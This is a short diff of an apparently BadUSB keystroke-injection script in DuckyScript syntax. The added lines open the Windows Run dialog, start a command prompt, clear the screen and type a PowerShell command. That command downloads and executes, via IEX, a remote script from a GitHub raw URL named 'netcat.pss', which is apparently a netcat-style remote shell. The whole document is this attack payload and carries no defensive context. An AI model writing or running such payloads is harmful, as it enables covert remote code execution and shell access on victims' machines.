@@ -1,4 +1,13 @@
-DELAY 1000
+DELAY 200
+
+GUI r
+STRING cmd
+DELAY 200
+
+STRING @echo off
+STRING cls
 STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/toballz/j/master/pshell/netcat.pss');"
+DELAY 150
+
 ENTER
-DELAY 1500
+DELAY 500
